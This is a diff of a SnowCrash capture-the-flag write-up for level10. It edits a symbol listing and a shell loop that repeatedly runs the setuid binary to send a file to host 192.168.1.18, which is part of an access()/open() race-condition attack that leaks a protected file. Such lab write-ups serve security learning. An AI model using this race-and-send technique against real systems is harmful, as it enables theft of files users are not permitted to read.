@@ -1,25 +1,16 @@
 The `level10` executable sends a file to a server on port 6969, but only if the user executing it have permissions to open the file, as you can see with the `nm` command:
 
 ``` shell
+level10@SnowCrash:~$ nm level10 
+
+    ...
+
+08048620 T _start
          U access@@GLIBC_2.0
 0804a064 b completed.6159
-         U connect@@GLIBC_2.0
-0804a044 W data_start
-0804a068 b dtor_idx.6161
-         U exit@@GLIBC_2.0
-         U fflush@@GLIBC_2.0
-080486b0 t frame_dummy
-         U htons@@GLIBC_2.0
-         U inet_addr@@GLIBC_2.0
-080486d4 T main
-         U open@@GLIBC_2.0
-         U printf@@GLIBC_2.0
-         U puts@@GLIBC_2.0
-         U read@@GLIBC_2.0
-         U socket@@GLIBC_2.0
-0804a060 B stdout@@GLIBC_2.0
-         U strerror@@GLIBC_2.0
-         U write@@GLIBC_2.0
+
+    ...
+    
 ```
 
 It uses `access` system call probably to check the permisions before send it up. I you refer the `access` man page you can see the following warning:
@@ -52,7 +43,7 @@ done
 
 ``` shell
 while true; do
-    ./level10 /tmp/dummy [your/host/path];
+    ./level10 /tmp/dummy 192.168.1.18;
 done
 ```
 
